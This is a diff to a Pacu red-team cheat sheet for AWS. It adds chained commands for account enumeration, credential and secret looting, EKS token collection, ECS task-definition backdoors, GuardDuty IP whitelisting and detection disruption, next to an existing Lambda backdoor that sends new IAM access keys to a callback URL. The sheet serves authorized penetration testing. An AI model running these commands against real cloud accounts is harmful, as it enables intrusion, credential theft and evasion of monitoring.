@@ -467,6 +467,55 @@ aws iam list-attached-user-policies --user-name "$target_user" | jq '.AttachedPo
 var target_user
 -->
 
+## operator runbooks
+
+### Account triage chain
+
+Run a quick low-risk account triage sequence before service-specific follow-up.
+
+```sh title:"Run Pacu account triage chain"
+run aws__enum_account && run aws__enum_spend && run iam__enum_permissions && run iam__enum_users_roles_policies_groups && run detection__enum_services
+```
+<!-- cheat -->
+
+### High-value service enum chain
+
+Enumerate common red-team pivot and data-exposure services after the account triage pass.
+
+```sh title:"Run Pacu high-value service enum chain"
+run ec2__enum && run lambda__enum && run ecs__enum && run eks__enum && run s3__download_bucket --names-only && run secrets__enum
+```
+<!-- cheat -->
+
+### Identity attack-path chain
+
+Populate IAM data, scan for privilege escalation paths without execution, and query high-impact permissions.
+
+```sh title:"Run Pacu IAM attack-path triage chain"
+run iam__enum_permissions --all-users && run iam__enum_users_roles_policies_groups && run iam__privesc_scan --scan-only && run iam__enum_action_query --query "$aws_iam_action_query"
+```
+<!-- cheat
+var aws_iam_action_query := iam:*,sts:AssumeRole,lambda:*,cloudformation:*,glue:*
+-->
+
+### Compute loot chain
+
+Collect compute metadata that often exposes bootstrap secrets, task roles, and deploy-time environment variables.
+
+```sh title:"Run Pacu compute loot enum chain"
+run ec2__download_userdata && run ecs__enum_task_def && run lambda__enum && run codebuild__enum && run lightsail__enum
+```
+<!-- cheat -->
+
+### Data exposure chain
+
+Prioritize services that commonly expose recoverable data or credentials.
+
+```sh title:"Run Pacu data exposure enum chain"
+run s3__download_bucket --names-only && run dynamodb__enum && run rds__enum_snapshots && run ebs__enum_volumes_snapshots && run systemsmanager__download_parameters
+```
+<!-- cheat -->
+
 ## enum workflow
 
 ### Account metadata
@@ -561,12 +610,32 @@ run ebs__enum_volumes_snapshots
 ```
 <!-- cheat -->
 
+### EBS public snapshots
+
+Search public EBS snapshots by keyword or account in the unauthenticated snapshot surface.
+
+```sh title:"Pacu enumerate public EBS snapshots"
+run ebs__enum_snapshots_unauth --keyword "$keyword"
+```
+<!-- cheat
+var keyword
+-->
+
 ### RDS snapshots
 
 Enumerate RDS snapshots, snapshot sharing, and unencrypted snapshots.
 
 ```sh title:"Pacu enumerate RDS snapshots"
 run rds__enum_snapshots
+```
+<!-- cheat -->
+
+### RDS enum
+
+Enumerate RDS instances, clusters, subnet groups, and parameter-group context.
+
+```sh title:"Pacu enumerate RDS"
+run rds__enum
 ```
 <!-- cheat -->
 
@@ -588,6 +657,15 @@ run ecs__enum_task_def
 ```
 <!-- cheat -->
 
+### ECS enum
+
+Enumerate ECS clusters, services, tasks, task definitions, and related role context.
+
+```sh title:"Pacu enumerate ECS"
+run ecs__enum
+```
+<!-- cheat -->
+
 ### ECR enum
 
 Enumerate ECR repositories and image tags.
@@ -602,7 +680,16 @@ run ecr__enum
 Enumerate EKS resources.
 
 ```sh title:"Pacu enumerate EKS"
-run eks_enum
+run eks__enum
+```
+<!-- cheat -->
+
+### EKS collect tokens
+
+Collect EKS authentication token material where the active identity is authorized.
+
+```sh title:"Pacu collect EKS tokens"
+run eks__collect_tokens
 ```
 <!-- cheat -->
 
@@ -620,7 +707,16 @@ run cognito__enum
 Enumerate API Gateway routes, methods, keys, client certificates, and export Swagger definitions.
 
 ```sh title:"Pacu enumerate API Gateway"
-run enum__apigateway
+run apigateway__enum
+```
+<!-- cheat -->
+
+### ACM enum
+
+Enumerate ACM certificates and private CA metadata for takeover, expiry, and phishing infrastructure leads.
+
+```sh title:"Pacu enumerate ACM"
+run acm__enum
 ```
 <!-- cheat -->
 
@@ -639,6 +735,60 @@ Enumerate CodeBuild projects and builds for sensitive environment variables.
 
 ```sh title:"Pacu enumerate CodeBuild"
 run codebuild__enum
+```
+<!-- cheat -->
+
+### Glue enum
+
+Enumerate Glue jobs, dev endpoints, crawlers, databases, and role references.
+
+```sh title:"Pacu enumerate Glue"
+run glue__enum
+```
+<!-- cheat -->
+
+### Directory Service enum
+
+Enumerate AWS Directory Service directories and trust relationships.
+
+```sh title:"Pacu enumerate Directory Service"
+run ds__enum
+```
+<!-- cheat -->
+
+### Elastic Beanstalk enum
+
+Enumerate Elastic Beanstalk applications, environments, configuration, and role context.
+
+```sh title:"Pacu enumerate Elastic Beanstalk"
+run elasticbeanstalk__enum
+```
+<!-- cheat -->
+
+### MQ enum
+
+Enumerate Amazon MQ brokers and configuration.
+
+```sh title:"Pacu enumerate Amazon MQ"
+run mq__enum
+```
+<!-- cheat -->
+
+### Transfer Family enum
+
+Enumerate AWS Transfer Family servers, users, and identity-provider configuration.
+
+```sh title:"Pacu enumerate Transfer Family"
+run transfer_family__enum
+```
+<!-- cheat -->
+
+### Inspector reports
+
+Download Inspector report data where available.
+
+```sh title:"Pacu get Inspector reports"
+run inspector__get_reports
 ```
 <!-- cheat -->
 
@@ -791,10 +941,10 @@ run iam__privesc_scan --scan-only
 Analyze previously exported IAM policy JSON offline.
 
 ```sh title:"Offline Pacu IAM privilege escalation scan"
-run iam__privesc_scan --offline --folder "$policy_folder"
+run iam__privesc_scan --offline --folder "$aws_policy_folder"
 ```
 <!-- cheat
-var policy_folder
+var aws_policy_folder
 -->
 
 ### Privesc selected user methods
@@ -851,15 +1001,33 @@ run api_gateway__create_api_keys
 ```
 <!-- cheat -->
 
+### CloudFormation resource injection
+
+Inject a controlled resource into CloudFormation stacks where explicitly authorized.
+
+```sh title:"Pacu CloudFormation resource injection"
+run cfn__resource_injection
+```
+<!-- cheat -->
+
+### CloudTrail CSV injection
+
+Test CloudTrail CSV injection exposure for approved reporting or detection validation.
+
+```sh title:"Pacu CloudTrail CSV injection"
+run cloudtrail__csv_injection
+```
+<!-- cheat -->
+
 ### EBS explore snapshots
 
 Restore and attach EBS volumes or snapshots to a supplied EC2 instance for mounted filesystem review.
 
 ```sh title:"Pacu explore EBS snapshots"
-run ebs__explore_snapshots --instance-id "$instance_id"
+run ebs__explore_snapshots --instance-id "$aws_instance_id"
 ```
 <!-- cheat
-var instance_id
+var aws_instance_id
 -->
 
 ### RDS explore snapshots
@@ -881,6 +1049,15 @@ run ec2__startup_shell_script --script "$script_file"
 <!-- cheat
 var script_file
 -->
+
+### ECS backdoor task definition
+
+Create or modify ECS task definition execution paths where persistence testing is explicitly in scope.
+
+```sh title:"Pacu backdoor ECS task definition"
+run ecs__backdoor_task_def
+```
+<!-- cheat -->
 
 ### Lightsail default keys
 
@@ -949,6 +1126,15 @@ run dynamodb__enum
 ```
 <!-- cheat -->
 
+### CloudFormation template loot
+
+Download CloudFormation templates and exports for offline secret review.
+
+```sh title:"Pacu loot CloudFormation templates"
+run cloudformation__download_data
+```
+<!-- cheat -->
+
 ## persistence
 
 ### IAM backdoor assume role
@@ -983,10 +1169,10 @@ run iam__backdoor_users_password
 Add ingress rules to selected EC2 security groups for an approved source IP.
 
 ```sh title:"Pacu backdoor EC2 security groups"
-run ec2__backdoor_ec2_sec_groups --source-ip "$source_ip"
+run ec2__backdoor_ec2_sec_groups --source-ip "$aws_source_ip"
 ```
 <!-- cheat
-var source_ip
+var aws_source_ip
 -->
 
 ### Lambda backdoor new users
@@ -994,10 +1180,10 @@ var source_ip
 Create a Lambda/EventBridge rule that reacts to new IAM users and sends created access keys to a listener.
 
 ```sh title:"Pacu backdoor new IAM users with Lambda"
-run lambda__backdoor_new_users --url "$callback_url"
+run lambda__backdoor_new_users --url "$aws_callback_url"
 ```
 <!-- cheat
-var callback_url
+var aws_callback_url
 -->
 
 ### Lambda backdoor new roles
@@ -1005,10 +1191,10 @@ var callback_url
 Create a Lambda/EventBridge rule that modifies new IAM role trust policies for an approved principal.
 
 ```sh title:"Pacu backdoor new IAM roles with Lambda"
-run lambda__backdoor_new_roles --principal "$principal_arn"
+run lambda__backdoor_new_roles --principal "$aws_principal_arn"
 ```
 <!-- cheat
-var principal_arn
+var aws_principal_arn
 -->
 
 ### Lambda backdoor new security groups
@@ -1016,10 +1202,10 @@ var principal_arn
 Create a Lambda/EventBridge rule that adds an approved ingress rule to new EC2 security groups.
 
 ```sh title:"Pacu backdoor new EC2 security groups with Lambda"
-run lambda__backdoor_new_sec_groups --source-ip "$source_ip"
+run lambda__backdoor_new_sec_groups --source-ip "$aws_source_ip"
 ```
 <!-- cheat
-var source_ip
+var aws_source_ip
 -->
 
 ## detection and logs
@@ -1051,6 +1237,17 @@ run guardduty__list_findings
 ```
 <!-- cheat -->
 
+### GuardDuty whitelist IP
+
+Add an approved source IP to GuardDuty trusted IP lists for controlled detection testing.
+
+```sh title:"Pacu whitelist GuardDuty source IP"
+run guardduty__whitelist_ip --source-ip "$aws_source_ip"
+```
+<!-- cheat
+var aws_source_ip
+-->
+
 ### CloudTrail event history
 
 Download CloudTrail event history JSON for approved regions. This can take a long time in busy accounts.
@@ -1066,6 +1263,15 @@ Download CloudWatch log events to the Pacu session downloads directory.
 
 ```sh title:"Pacu download CloudWatch logs"
 run cloudwatch__download_logs
+```
+<!-- cheat -->
+
+### Detection disruption
+
+Run Pacu's detection disruption module only when detection-control tampering is explicitly authorized.
+
+```sh title:"Pacu detection disruption"
+run detection__disruption
 ```
 <!-- cheat -->
 
@@ -1106,10 +1312,10 @@ var aws_role_names
 Attempt to subscribe an email address to an SNS topic ARN.
 
 ```sh title:"Pacu SNS subscribe"
-run sns__subscribe --topic-arn "$topic_arn" --email "$email"
+run sns__subscribe --topic-arn "$aws_sns_topic_arn" --email "$email"
 ```
 <!-- cheat
-var topic_arn
+var aws_sns_topic_arn
 var email
 -->
 
